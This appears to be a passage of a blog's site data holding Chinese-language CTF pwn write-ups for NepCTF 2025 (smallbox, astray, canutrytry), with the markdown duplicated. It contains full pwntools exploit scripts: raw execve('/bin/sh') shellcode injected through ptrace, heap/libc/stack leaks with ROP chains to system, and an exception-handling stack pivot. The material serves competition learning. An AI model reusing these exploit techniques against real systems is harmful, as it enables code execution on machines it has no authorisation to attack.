class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">    getshell=libc_base+one[<span class=\"number\">0</span>]</span><br><span class=\"line\">    delete(<span class=\"number\">1</span>,<span class=\"built_in\">str</span>(getshell).encode())</span><br><span class=\"line\">    </span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        io,elf=loadfile(<span class=\"string\">&quot;./heap&quot;</span>,<span class=\"string\">&quot;&quot;</span>,<span class=\"number\">0</span>)</span><br><span class=\"line\">        pwn()</span><br><span class=\"line\">        io.interactive()</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        io.close()</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"ez-jail\"><a href=\"#ez-jail\" class=\"headerlink\" title=\"ez_jail\"></a>ez_jail</h2><h2 id=\"静态分析-1\"><a href=\"#静态分析-1\" class=\"headerlink\" title=\"静态分析\"></a>静态分析</h2><p><img src=\"https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/20250920223356355.png\" alt=\"image.png\"></p>\n<p>uaf可以配合<code>show</code>,泄露main_arena 信息来泄露libc ,但是要如何利用呢?</p>\n"},{"title":"Nepctf-2025-pwn","cover":"/img/治不开心药.png","_content":"# Nepctf--pwn复现\n\n## time\n\n## smallbox\n\n### 查看沙箱\n\n题目名字和描述都很明显，拖下来首先就是看一下沙箱。发现只允许一个syscall，ptrace。之前也没遇到过这类题目，先去了解了一下。\n\n![image-20250728093312153](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093312153.png)\n\n### ida分析\n\n先用mmap分配了一块空间，并给了可读可写可执行的权限。然后fork，然后read，然后上沙箱。最后会调用shellcode。\n\n![image-20250728093914695](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093914695.png)\n\n### 思路\n\n1.沙箱禁用了其他函数，只能使用ptrace 操作。可以获取子进程pid，所以可以操作子进程。 因为沙箱再后面install ，但是子进程出来一直在循环，所以还没装沙箱。\n\n2.利用ptrace修改子进程rip，使其跳过沙箱。同时通过ptrace 往子进程的空间中写入shellcode ，最后让子进程跳转到这，因为没有沙箱，所以子进程就可以getshell。\n\n### exp\n\n当时写的时候，没有通过ptrace,去往里写，以为父进程中读入的shellcode，子进程也有。反复尝试了很久，都失败了。还以为是attach 失败，又或者是改rip错了。后面意识到，一个点，父进程中输入的shellcdoe ，子进程不应该有才对，才反应过了同过ptrace往里写。也是学到了。\n\n之前看到fork 只能联想到爆破cananry，现在知道可以通过ptrace控制子进程了。\n\n```python\nfrom esy import *\ncontext.log_level='debug'\ncontext.arch=\"amd64\"\n#io,elf=loadfile(\"./smallbox\",\"\",0)\n#context.terminal=['tmux','splitw','-h','-l','66%']\nhost=\"nepctf31-oted-rgpe-shrp-juf9qwjd6957.nepctf.com\"\nport=443\nio= remote(host, port, ssl=True, sni=host)\nexecve_shellcode=(\nb'\\x48\\xC7\\xC0\\x3b\\x00\\x00\\x00' # mov rax,0x3b\nb'\\x48\\xBF\\x19\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00' # mov rdi,0xdeadc0de019\nb'\\x48\\x31\\xf6'   # xor rsi,rsi\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x0f\\x05'       # syscall\nb'/bin/sh\\x00'\n)\n\nshellcode=(\nb'\\x44\\x8B\\x7D\\xF4' # mov r15d,[rbp-0xc]\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x10\\x00\\x00\\x00' # mov rsi,10h\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x4D\\x31\\xD2'   # xor r10,r10\nb'\\x0f\\x05'       # syscall\n\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x0c\\x00\\x00\\x00' # mov rsi,ch\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r10,0x0deadc0de500\nb'\\x0f\\x05'       # syscall\n)\nshellcode+=(\nb'\\x49\\xB8\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r8,0x0deadc0de000\nb'\\x49\\xB9\\x00\\xE2\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r8,0x0deadc0de200\n)\nshellcode+=4*(\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC7\\x05\\x00\\x00\\x00' # mov rsi,10h\nb'\\x4C\\x89\\xC2' # mov rdx, r8\nb'\\x4D\\x8B\\x11'#mov  r10, [r9]\nb'\\x0f\\x05'       # syscall\n\nb'\\x49\\x83\\xC0\\x08' # add r8+8\nb'\\x49\\x83\\xC1\\x08' # add r8+8\n)\nshellcode+=(\nb'\\x49\\xB9\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00' #  mov r9,0x0deadc0de200\nb'\\x49\\xB8\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r8,0x0deadc0de500\nb'\\x4D\\x89\\x88\\x80\\x00\\x00\\x00'             #  mov    [r8+0x80],r9\n\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x0d\\x00\\x00\\x00' # mov rsi,dh\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r10,0x0deadc0de500\nb'\\x0f\\x05'       # syscall\n\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x11\\x00\\x00\\x00' # mov rsi,17h\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x4D\\x31\\xD2'   # xor r10,r10\nb'\\x0f\\x05'       # syscall\n)\nshellcode+=asm('''\nloop:\n    jmp loop\n''')\nshellcode=shellcode.ljust(0x200,b'\\x61')\nshellcode+=execve_shellcode\n#gdb.attach(io)\nio.send(shellcode)\nio.interactive()\n```\n\n\n\n## astray\n\n### ida 分析\n\n首先这题很绕，几个地址跳来跳去的，我们要先从init详细分析清楚结构\n\n| 地址            | 保存内容       |\n| ---------------------------- | --------------- |\n| manage_physic[0] |heap_addr |\n| magnage_physic[2*i]    (偶数项) | heap_addr+256*i |\n| heap2                        | 0               |\n| heap2+0x8                    | 0               |\n| heap2+0x10                   | 0               |\n| V3                           | heap_addr       |\n| heap_addr                    | 1               |\n| heap_addr+0x8                | heap3           |\n| heap_addr+0x10               | &onlyuser       |\n| heap3                        | 0               |\n| heap3+0x8                    | 0               |\n| heap3+0x10                   | 0               |\n\n可以看到，mange_pyhsic , heap2 ，heap_addr(heap1),heap3,几个变量，其中，heap1，heap3，不在bss上，user中依靠heap2去寻址，manage中依靠heap1去寻址。寻址通过idx ，从manage_physic中赋值给heap2，和heap3 。这里有一个逻辑漏洞，在check中。\n\n#### check函数\n\n![image-20250804134532550](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804134532550.png)\n\n这里只检测，idx大于等于0x14也就是20 ，但没有检测下限，如果这里的idx等于0，那么后面赋值时，就会发生巨大的变化。同时，两个用户可以互用对方的操作。\n\n但是在check函数还有一个检测，如果是idx是0 ，即 n0x14=0，那么v5= manage_physic.所以v5[1]=*(manage_physic+8),也就是0x10，是过不了检测的。\n\n正常情况下，我们会读写magnage_physic[2*i] 中的内容，但是如果i=0，在User中，我们可以写heap1 这个堆块的内容 ，这里可以修改掉其上的指针，如果后续可以对其上的指针进行读写，那就可以任意地址读写。在manage中会有不同\n\n![image-20250804143259945](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804143259945.png)\n\n这里有两个可以读写的地址，** (heap+8),是heap3，也就是与idx相关的。** （ *  （heap+16）+ 8），这是 ** heap2，也就是user中 依靠的寻址方式。同时补充一下对权限的检测\n\n![image-20250804162343842](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804162343842.png)\n\n在初始化时，这里对每一个块都初始了权限，那么其实对& 运算稍微了解一下就知道了。因为manage_physic[0]的权限是0x10，很特殊，似乎manage和user都没有权限去修改。但是，如果进入manage时，**使用user_write去执行呢，似乎可以避开权限的检测**，但是后续会继续检测，也无法往里write。\n\n### 思路分析\n\n#### 通过MANAGE_visit\n\n因为直接使用两个write都过不了检测，但是我们使用manage_visit 可以轻松过check，只要heap2不为空。也就说，只要在usr中，过check赋值，就可以在manage中读写。那么我们进入usr_operation,输入MANAGE_visit，就可以过check赋值，而且不做读写操作。此时heap2[0]=heap_addr.\n再从manage_operation中读，可以读到pie和堆的地址信息。再写，就可以覆盖heap1 中 的内容。如果选择覆盖heap1+0x8，那么下次准备往目标写的时候，这个位置又会被覆盖掉。\n所以，只能通过heap1+0x10的位置来完成任意地址读写。我们把改写后的地方称为fake_addr(位置与&onlyuser位置重合),那么我们之后从manage中访问到的就是** (fake_addr+0x8).\n\n![image-20250805013545343](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805013545343.png)\n\n#### 任意地址读写\n\n这样看就清楚很多，如果我们把heap1+0x10 修改为 heap3-8，那么我们可以通过manage_write,修改* (magnage_physic[2*i])，继而通过manage_visit,去任意地址读写。\n\n#### 泄露stack，再rop\n\n有读写，泄露的思路自然不用多说。那最后如何getshell呢？保护机制全开，不能修改got，排除syscall和 shellcode ，那就只能rop了，所以还要泄露栈地址。通过libc中的environ泄露栈地址，这个地址与返回地址的偏移动调直接看就行。\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level='debug'\n#context.terminal=['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"./astray\")\nlibc=ELF(\"./libc.so.6\")\n\n#manager=0x41A8\n# 0x4060\npop_rdi=0x2a3e5\nret=0x29139\ndef manager(op,idx):\n    io.recvuntil(\"Which permission do you want to log in with?(1:manager 1000:user)\")\n    io.sendline(str(1))\n    io.recvuntil(\"visit user(MANAGER_visit)\\n\")\n    io.send(op)\n    io.recvuntil(\"1-19: manager can visit\\n\")\n    io.sendline(str(idx))\n\ndef user(op,idx):\n    io.recvuntil(\"Which permission do you want to log in with?(1:manager 1000:user)\")\n    io.sendline(str(1000))\n    io.recvuntil(\"user write to logs(USER_write)\\n\")\n    io.send(op)\n    io.recvuntil(\"10-19: user can visit\\n\")\n    io.sendline(str(idx))\n \ndef manager_read():\n\tmanager(\"MANAGER_read\",\"1\")\n\t\ndef manager_write(content):\n\tmanager(\"MANAGER_write\",\"1\")\n\tio.send(content)\n\t\ndef manager_user_read():\n\tmanager(\"MANAGER_visit\",1)\n\tio.sendlineafter(\"to user_logs\\n\",\"1\")\n\t\ndef manager_user_write(content):\n\tmanager(\"MANAGER_visit\",1)\n\tio.sendlineafter(\"to user_logs\\n\",\"2\")\n\tio.send(content)\n\t    \n#gdb.attach(io,\"b *$rebase(0x179F)\")\n# leak pie & heap\nuser(\"MANAGER_visit\",0)\nmanager_user_read()\nio.recv(8)\nheap_addr=u64(io.recv(6).ljust(8,b'\\x00'))#-0x1f30\nio.recv(2)\npie=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x41a0\nlogv(\"heap_addr\",hex(heap_addr))\nlogv(\"pie\",hex(pie))\n\n# heap1-> next = manage_physic[2]\nmanager_user_write(p64(1)+p64(heap_addr)+p64(heap_addr-8))\n\n# leak libc\nmanager_write(p64(pie+elf.got[\"puts\"]))\nmanager_user_read()\nputs=u64(io.recv(6).ljust(8,b\"\\x00\"))\nlibc_base=puts-libc.sym[\"puts\"]\nlogv(\"libc_base\",hex(libc_base))\nsystem=libc_base+libc.sym[\"system\"]\nbin_sh=libc_base+next(libc.search(\"/bin/sh\\x00\"))\npop_rdi=libc_base+pop_rdi\nret=libc_base+ret\n# leak stack\nmanager_write(p64(libc_base+libc.sym[\"environ\"]))\nmanager_user_read()\nstack=u64(io.recv(6).ljust(8,b'\\x00'))-0x150\n\n# heap1->next=stack\nmanager_write(p64(stack))\npayload=p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)\nmanager_user_write(payload)\n\n#user(\"USER_write\",0)\n#io.sendlineafter(\"user_logs\\n\",str(1))\nio.interactive()\n\n```\n\n\n\n## canutrytry\n\n### 查看沙箱\n\n![image-20250805082927143](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805082927143.png)\n\n\n\n只允许read，write，close，futex的syscall。看来是要ORW了。\n\n### ida 分析\n\n打开一看发现这是一道c++的题目。先从main函数开始分析函数的主要逻辑。\n\n#### main\n\n\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805210913492.png)\n\n先看汇编，发现有很多try，catch，这是c++的异常处理。反汇编后这些部分没有显示出来，我们先不看，先分析主要功能。\n\n![main函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213430837.png)\n\n两个主要功能，visit()和left()\n\n##### visit\n\n![visit函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805213930699.png)\n![visit函数](C:/Users/22354/AppData/Roaming/Typora/typora-user-images/image-20250805214633791.png)\n\nvisit中有三个选项，2只能按顺序设置堆块大小且只有2次，1 只能按顺序malloc两次堆块，3 可以任意写堆块的内容。且idx无检测。\n\n1 选项中有对异常的处理。\n\n##### left\n\n![left函数](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805221246184.png)\n\n只有一次机会，可以把堆块的内容复制到栈上，大小无限制。且有对异常的处理。\n\n毫无疑问，此题中异常处理是至关重要的。所以我们接下来要分析所以try ，catch的对应关系。\n\n### 异常处理对应\n\n##### 分析方法\n\nida在汇编代码中，会对catch标记，在其后面标注owner by xxx\n\n![catch](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222122309.png) \n\n根据这样的对应关系，我们可以把main函数重新反汇编一下，把完整的函数逆向出来。\n\n当然ida 有视图可以更好的看出函数的跳转对应关系\n\n![跳转](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805222435058.png)\n\n##### 分析结果\n\n```c\nint main(){\n    seccomp_add();\n    while(1)\n    {\n        while(1){\n            try{\n                menu();\n            }\n            catch{\n                sub_4016ec();\n                sub_401652();\n            }\n        \n            try{\n                stdin>>choice;\n                if(choice!=1) break;\n                visit_nep();\n                if(choice!=2) exit(0);\n                left_nep();\n            }\n            catch{\n                std::cout << \"you catch the error \" << err2 << std::endl;\n                std::cout << \"here is a gift for you!\" << std::endl;\n    \n                printf(\"setbufaddr:%p\\n\", setbuf_ptr);\n                printf(\"stackaddr:%p\\n\", &choice);\n            }\n        }\n\n    } \n    \n}\n```\n\n#### 思路分析\n\n1. 首先要通过visit或left中的异常处理，泄露出stack和 libc的信息。要注意的是，为了后续利用，这一步显然是通过visit 的异常，也就是size值非法。再注意，因为只能按顺序来，所以第一个堆块不能非法。所以要先申请第一个堆块后，利用第二个堆块的大小非法，触发异常拿到stack 和 libc \n2. 紧接着，要利用left中的异常，也就是复制的内容长度超过16.这里需要让异常处理跳转到menu（）的异常处理。只要把left的返回地址，修改为menu 函数执行完成时的返回地址就行。\n3. 第二步完成后，程序跳转到0x4610ec。这里会往bss 段上read ，显然是用来输入ROP的。\n4. 第三步过后，通过0x401652函数，程序最后跳转到0x4015d4。又有一次read，可以覆盖到rbp，同样会触发异常。但是最后还是会leave_ret,可以栈迁移。只要把rbp覆盖为之前输入ROP的地址-8 ，就行。\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level='debug'\nio,elf=loadfile(\"./canutrytry\",\"\",0)\nlibc=ELF(\"./libc.so.6\")\ndef visit():\n\tio.sendlineafter(\"your choice >>\",\"1\")\n\t\ndef leave():\n\tio.sendlineafter(\"your choice >>\",\"2\")\n\ndef visit_op(op,size,idx): # size(content),1\n\tvisit()\n\tio.sendlineafter(\"your choice >>\",str(op))\n\tif op == 2 :\n\t\tio.sendlineafter(\"size\",str(size))\n\telif op == 3 :\n\t\tio.sendlineafter(\"index\",str(idx))\n\t\tio.sendafter(\"content\",size)\n\ndef leave_op(idx):\n\tleave()\n\tio.sendlineafter(\"index: \",str(idx))\n\n\ngdb.attach(io,\"b *0x401600\")\n#1 leak libc & stack\nvisit_op(2,0x40,0)\nvisit_op(1,0,0)\nvisit_op(2,-1,0)\nvisit_op(1,0,0)\n\nio.recvuntil(\"setbufaddr:\")\nlibc_base=int(io.recv(14),16)-0x88060\nio.recvuntil(\"stackaddr:\")\nstack=int(io.recv(14),16)\nlogv(\"libc\",hex(libc_base))\nlogv(\"stack\",hex(stack))\n\nwrite=libc_base+libc.sym[\"write\"]\n## gadgets\npop_rdi=libc_base + 0x2a3e5\npop_rsi=libc_base + 0x2be51\npop_rdx=libc_base + 0x11f497  # pop rdx;pop r12;ret\nleave_ret=0x401650\n## addr \nROP=0x4016EC\nflag=0x4053C0\nbuf=0x405460\n\n#2 prepare my ROP \npayload=0x20*b\"a\"+p64(buf)+p64(0x401ed9)\nvisit_op(3,payload,0)\nleave_op(0)\n\n#3 orw  flag\npayload = p64(0)+p64(pop_rdi)+p64(2)\npayload+= p64(pop_rsi)+p64(flag)\npayload+= p64(pop_rdx)+p64(0x64)+p64(0)\npayload+= p64(write)\nio.sendafter(\"well,prepare your rop now!\",payload)\n\n#4\npayload = b\"a\"*0x10\npayload+= p64(buf) \nio.sendafter(\"Enter your flag: \",b\"hhhh\")\n\n#5\nio.send(payload) \nio.interactive()\n\n```\n\n","source":"_posts/ctf比赛复现/Nepctf-2025-pwn复现.md","raw":"---\ntitle: Nepctf-2025-pwn\ntags:\n    - 中等难度\n    - pwn\ncategories:\n    - 比赛记录\ncover: /img/治不开心药.png\n---\n# Nepctf--pwn复现\n\n## time\n\n## smallbox\n\n### 查看沙箱\n\n题目名字和描述都很明显，拖下来首先就是看一下沙箱。发现只允许一个syscall，ptrace。之前也没遇到过这类题目，先去了解了一下。\n\n![image-20250728093312153](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093312153.png)\n\n### ida分析\n\n先用mmap分配了一块空间，并给了可读可写可执行的权限。然后fork，然后read，然后上沙箱。最后会调用shellcode。\n\n![image-20250728093914695](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250728093914695.png)\n\n### 思路\n\n1.沙箱禁用了其他函数，只能使用ptrace 操作。可以获取子进程pid，所以可以操作子进程。 因为沙箱再后面install ，但是子进程出来一直在循环，所以还没装沙箱。\n\n2.利用ptrace修改子进程rip，使其跳过沙箱。同时通过ptrace 往子进程的空间中写入shellcode ，最后让子进程跳转到这，因为没有沙箱，所以子进程就可以getshell。\n\n### exp\n\n当时写的时候，没有通过ptrace,去往里写，以为父进程中读入的shellcode，子进程也有。反复尝试了很久，都失败了。还以为是attach 失败，又或者是改rip错了。后面意识到，一个点，父进程中输入的shellcdoe ，子进程不应该有才对，才反应过了同过ptrace往里写。也是学到了。\n\n之前看到fork 只能联想到爆破cananry，现在知道可以通过ptrace控制子进程了。\n\n```python\nfrom esy import *\ncontext.log_level='debug'\ncontext.arch=\"amd64\"\n#io,elf=loadfile(\"./smallbox\",\"\",0)\n#context.terminal=['tmux','splitw','-h','-l','66%']\nhost=\"nepctf31-oted-rgpe-shrp-juf9qwjd6957.nepctf.com\"\nport=443\nio= remote(host, port, ssl=True, sni=host)\nexecve_shellcode=(\nb'\\x48\\xC7\\xC0\\x3b\\x00\\x00\\x00' # mov rax,0x3b\nb'\\x48\\xBF\\x19\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00' # mov rdi,0xdeadc0de019\nb'\\x48\\x31\\xf6'   # xor rsi,rsi\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x0f\\x05'       # syscall\nb'/bin/sh\\x00'\n)\n\nshellcode=(\nb'\\x44\\x8B\\x7D\\xF4' # mov r15d,[rbp-0xc]\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x10\\x00\\x00\\x00' # mov rsi,10h\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x4D\\x31\\xD2'   # xor r10,r10\nb'\\x0f\\x05'       # syscall\n\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x0c\\x00\\x00\\x00' # mov rsi,ch\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r10,0x0deadc0de500\nb'\\x0f\\x05'       # syscall\n)\nshellcode+=(\nb'\\x49\\xB8\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r8,0x0deadc0de000\nb'\\x49\\xB9\\x00\\xE2\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r8,0x0deadc0de200\n)\nshellcode+=4*(\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC7\\x05\\x00\\x00\\x00' # mov rsi,10h\nb'\\x4C\\x89\\xC2' # mov rdx, r8\nb'\\x4D\\x8B\\x11'#mov  r10, [r9]\nb'\\x0f\\x05'       # syscall\n\nb'\\x49\\x83\\xC0\\x08' # add r8+8\nb'\\x49\\x83\\xC1\\x08' # add r8+8\n)\nshellcode+=(\nb'\\x49\\xB9\\x00\\xE0\\x0D\\xDC\\xEA\\x0D\\x00\\x00' #  mov r9,0x0deadc0de200\nb'\\x49\\xB8\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r8,0x0deadc0de500\nb'\\x4D\\x89\\x88\\x80\\x00\\x00\\x00'             #  mov    [r8+0x80],r9\n\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x0d\\x00\\x00\\x00' # mov rsi,dh\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x49\\xBA\\x00\\xE5\\x0D\\xDC\\xEA\\x0D\\x00\\x00'   # mov r10,0x0deadc0de500\nb'\\x0f\\x05'       # syscall\n\nb'\\x44\\x89\\xFe'     # mov edi,r15d\nb'\\x48\\xC7\\xC0\\x65\\x00\\x00\\x00' # mov rax,101\nb'\\x48\\xC7\\xC7\\x11\\x00\\x00\\x00' # mov rsi,17h\nb'\\x48\\x31\\xD2'   # xor rdx,rdx\nb'\\x4D\\x31\\xD2'   # xor r10,r10\nb'\\x0f\\x05'       # syscall\n)\nshellcode+=asm('''\nloop:\n    jmp loop\n''')\nshellcode=shellcode.ljust(0x200,b'\\x61')\nshellcode+=execve_shellcode\n#gdb.attach(io)\nio.send(shellcode)\nio.interactive()\n```\n\n\n\n## astray\n\n### ida 分析\n\n首先这题很绕，几个地址跳来跳去的，我们要先从init详细分析清楚结构\n\n| 地址            | 保存内容       |\n| ---------------------------- | --------------- |\n| manage_physic[0] |heap_addr |\n| magnage_physic[2*i]    (偶数项) | heap_addr+256*i |\n| heap2                        | 0               |\n| heap2+0x8                    | 0               |\n| heap2+0x10                   | 0               |\n| V3                           | heap_addr       |\n| heap_addr                    | 1               |\n| heap_addr+0x8                | heap3           |\n| heap_addr+0x10               | &onlyuser       |\n| heap3                        | 0               |\n| heap3+0x8                    | 0               |\n| heap3+0x10                   | 0               |\n\n可以看到，mange_pyhsic , heap2 ，heap_addr(heap1),heap3,几个变量，其中，heap1，heap3，不在bss上，user中依靠heap2去寻址，manage中依靠heap1去寻址。寻址通过idx ，从manage_physic中赋值给heap2，和heap3 。这里有一个逻辑漏洞，在check中。\n\n#### check函数\n\n![image-20250804134532550](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804134532550.png)\n\n这里只检测，idx大于等于0x14也就是20 ，但没有检测下限，如果这里的idx等于0，那么后面赋值时，就会发生巨大的变化。同时，两个用户可以互用对方的操作。\n\n但是在check函数还有一个检测，如果是idx是0 ，即 n0x14=0，那么v5= manage_physic.所以v5[1]=*(manage_physic+8),也就是0x10，是过不了检测的。\n\n正常情况下，我们会读写magnage_physic[2*i] 中的内容，但是如果i=0，在User中，我们可以写heap1 这个堆块的内容 ，这里可以修改掉其上的指针，如果后续可以对其上的指针进行读写，那就可以任意地址读写。在manage中会有不同\n\n![image-20250804143259945](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804143259945.png)\n\n这里有两个可以读写的地址，** (heap+8),是heap3，也就是与idx相关的。** （ *  （heap+16）+ 8），这是 ** heap2，也就是user中 依靠的寻址方式。同时补充一下对权限的检测\n\n![image-20250804162343842](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250804162343842.png)\n\n在初始化时，这里对每一个块都初始了权限，那么其实对& 运算稍微了解一下就知道了。因为manage_physic[0]的权限是0x10，很特殊，似乎manage和user都没有权限去修改。但是，如果进入manage时，**使用user_write去执行呢，似乎可以避开权限的检测**，但是后续会继续检测，也无法往里write。\n\n### 思路分析\n\n#### 通过MANAGE_visit\n\n因为直接使用两个write都过不了检测，但是我们使用manage_visit 可以轻松过check，只要heap2不为空。也就说，只要在usr中，过check赋值，就可以在manage中读写。那么我们进入usr_operation,输入MANAGE_visit，就可以过check赋值，而且不做读写操作。此时heap2[0]=heap_addr.\n再从manage_operation中读，可以读到pie和堆的地址信息。再写，就可以覆盖heap1 中 的内容。如果选择覆盖heap1+0x8，那么下次准备往目标写的时候，这个位置又会被覆盖掉。\n所以，只能通过heap1+0x10的位置来完成任意地址读写。我们把改写后的地方称为fake_addr(位置与&onlyuser位置重合),那么我们之后从manage中访问到的就是** (fake_addr+0x8).\n\n![image-20250805013545343](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250805013545343.png)\n\n#### 任意地址读写\n\n这样看就清楚很多，如果我们把heap1+0x10 修改为 heap3-8，那么我们可以通过manage_write,修改* (magnage_physic[2*i])，继而通过manage_visit,去任意地址读写。\n\n#### 泄露stack，再rop\n\n有读写，泄露的思路自然不用多说。那最后如何getshell呢？保护机制全开，不能修改got，排除syscall和 shellcode ，那就只能rop了，所以还要泄露栈地址。通过libc中的environ泄露栈地址，这个地址与返回地址的偏移动调直接看就行。\n\n### exp\n\n```python\nfrom esy import *\ncontext.log_level='debug'\n#context.terminal=['tmux','splitw','-h','-l','66%']\nio,elf=loadfile(\"./astray\")\nlibc=ELF(\"./libc.so.6\")\n\n#manager=0x41A8\n# 0x4060\npop_rdi=0x2a3e5\nret=0x29139\ndef manager(op,idx):\n    io.recvuntil(\"Which permission do you want to log in with?(1:manager 1000:user)\")\n    io.sendline(str(1))\n    io.recvuntil(\"visit user(MANAGER_visit)\\n\")\n    io.send(op)\n    io.recvuntil(\"1-19: manager can visit\\n\")\n    io.sendline(str(idx))\n\ndef user(op,idx):\n    io.recvuntil(\"Which permission do you want to log in with?(1:manager 1000:user)\")\n    io.sendline(str(1000))\n    io.recvuntil(\"user write to logs(USER_write)\\n\")\n    io.send(op)\n    io.recvuntil(\"10-19: user can visit\\n\")\n    io.sendline(str(idx))\n \ndef manager_read():\n\tmanager(\"MANAGER_read\",\"1\")\n\t\ndef manager_write(content):\n\tmanager(\"MANAGER_write\",\"1\")\n\tio.send(content)\n\t\ndef manager_user_read():\n\tmanager(\"MANAGER_visit\",1)\n\tio.sendlineafter(\"to user_logs\\n\",\"1\")\n\t\ndef manager_user_write(content):\n\tmanager(\"MANAGER_visit\",1)\n\tio.sendlineafter(\"to user_logs\\n\",\"2\")\n\tio.send(content)\n\t    \n#gdb.attach(io,\"b *$rebase(0x179F)\")\n# leak pie & heap\nuser(\"MANAGER_visit\",0)\nmanager_user_read()\nio.recv(8)\nheap_addr=u64(io.recv(6).ljust(8,b'\\x00'))#-0x1f30\nio.recv(2)\npie=u64(io.recv(6).ljust(8,b\"\\x00\"))-0x41a0\nlogv(\"heap_addr\",hex(heap_addr))\nlogv(\"pie\",hex(pie))\n\n# heap1-> next = manage_physic[2]\nmanager_user_write(p64(1)+p64(heap_addr)+p64(heap_addr-8))\n\n# leak libc\nmanager_write(p64(pie+elf.got[\"puts\"]))\nmanager_user_read()\nputs=u64(io.recv(6).ljust(8,b\"\\x00\"))\nlibc_base=puts-libc.sym[\"puts\"]\nlogv(\"libc_base\",hex(libc_base))\nsystem=libc_base+libc.sym[\"system\"]\nbin_sh=libc_base+next(libc.search(\"/bin/sh\\x00\"))\npop_rdi=libc_base+pop_rdi\nret=libc_base+ret\n# leak stack\nmanager_write(p64(libc_base+libc.sym[\"environ\"]))\nmanager_user_read()\nstack=u64(io.recv(6).ljust(8,b'\\x00'))-0x150\n\n# heap1->next=stack\nmanager_write(p64(stack))\npayload=p64(pop_rdi)+p64(bin_sh)+p64(ret)+p64(system)\nmanager_user_write(payload)\n\n#user(\"USER_write\",0)\n#io.sendlineafter(\"user_logs\\n\",str(1))\nio.interactive()\n\n```\n\n\n\n## canutrytry\n\n### 